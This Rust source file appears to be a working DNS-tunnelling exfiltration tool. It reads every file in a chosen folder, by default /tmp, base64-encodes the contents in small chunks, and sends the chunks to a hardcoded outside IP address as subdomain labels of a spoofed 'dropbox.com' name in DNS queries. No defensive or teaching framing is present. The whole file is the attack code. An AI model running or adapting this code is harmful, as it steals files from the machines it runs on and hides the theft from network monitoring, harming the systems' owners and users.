use std::env;
use std::fs;
use std::path::Path;
use base64::{Engine as _, engine::general_purpose};
use trust_dns_resolver::config::*;
use trust_dns_resolver::Resolver;
use std::net::IpAddr;
use std::str::FromStr;

const DEFAULT_FOLDER: &str = "/tmp"; // Unix equivalent of C:\Tmp
const SERVER_IP: &str = "159.89.17.63";
const DOMAIN: &str = "dropbox.com";
const CHUNK_SIZE: usize = 80;

fn safe_base64_encode(bytes: &[u8]) -> String {
    // Use URL-safe base64, REMOVE padding for DNS compatibility
    let b64 = general_purpose::URL_SAFE_NO_PAD.encode(bytes);
    b64
}

fn resolve_dns(subdomain: &str, server_ip: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Create resolver with custom server
    let server_addr: IpAddr = server_ip.parse()?;
    let mut config = ResolverConfig::new();
    config.add_name_server(NameServerConfig {
        socket_addr: (server_addr, 53).into(),
        protocol: Protocol::Udp,
        tls_dns_name: None,
        trust_negative_responses: true,
        bind_addr: None,
    });
    
    let resolver = Resolver::new(config, ResolverOpts::default())?;
    
    // Perform DNS lookup
    let _response = resolver.lookup_ip(subdomain)?;
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Parse command line arguments
    let args: Vec<String> = env::args().collect();
    let folder = if args.len() > 1 {
        &args[1]
    } else {
        DEFAULT_FOLDER
    };

    let folder_path = Path::new(folder);
    if !folder_path.exists() || !folder_path.is_dir() {
        eprintln!("Error: Folder '{}' does not exist or is not a directory", folder);
        return Ok(());
    }

    // Iterate through files in the folder
    for entry in fs::read_dir(folder_path)? {
        let entry = entry?;
        let file_path = entry.path();
        
        // Skip if not a file
        if !file_path.is_file() {
            continue;
        }

        let file_name = file_path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("unknown");

        // Read file bytes
        let bytes = match fs::read(&file_path) {
            Ok(bytes) => bytes,
            Err(e) => {
                println!("Failed to read file '{}': {}", file_name, e);
                continue;
            }
        };

        // Clean filename - alphanumeric only
        let clean_filename: String = file_name.chars()
            .filter(|c| c.is_alphanumeric())
            .collect();

        let total_chunks = (bytes.len() + CHUNK_SIZE - 1) / CHUNK_SIZE; // Ceiling division

        // Send filename as the first query
        let filename_subdomain = format!("filename.{}.{}", clean_filename, DOMAIN);
        match resolve_dns(&filename_subdomain, SERVER_IP) {
            Ok(_) => println!("Filename {} initialized", clean_filename),
            Err(e) => {
                println!("Filename {} upload failed: {}", clean_filename, e);
                continue; // Skip to next file if filename setup fails
            }
        }

        // Send file chunks
        for i in 0..total_chunks {
            let start = i * CHUNK_SIZE;
            let size = std::cmp::min(CHUNK_SIZE, bytes.len() - start);
            let chunk_bytes = &bytes[start..start + size];
            let safe_chunk = safe_base64_encode(chunk_bytes);

            // SPLIT BASE64 CHUNK INTO DNS LABELS (max 63 chars each)
            let mut chunk_labels = Vec::new();
            let mut pos = 0;
            while pos < safe_chunk.len() {
                let len = std::cmp::min(63, safe_chunk.len() - pos);
                chunk_labels.push(&safe_chunk[pos..pos + len]);
                pos += len;
            }

            let chunk_label = format!("{:04}", i);
            
            // Build subdomain: chunk_label.total_chunks.chunk_data_labels.domain
            let mut labels = vec![chunk_label.as_str(), &total_chunks.to_string()];
            labels.extend(chunk_labels);
            labels.push(DOMAIN);
            
            let subdomain = labels.join(".");

            // Check if subdomain is too long (DNS limit is 253 chars)
            if subdomain.len() > 253 {
                println!("Warning: Subdomain too long for chunk {:04}, skipping", i);
                continue;
            }

            match resolve_dns(&subdomain, SERVER_IP) {
                Ok(_) => println!("Chunk {:04} sent", i),
                Err(e) => println!("Chunk {:04} from {} failed: {}", i, clean_filename, e),
            }
        }
        
        println!("File {} sent.", clean_filename);
    }
    
    println!("All files sent.");
    Ok(())
}
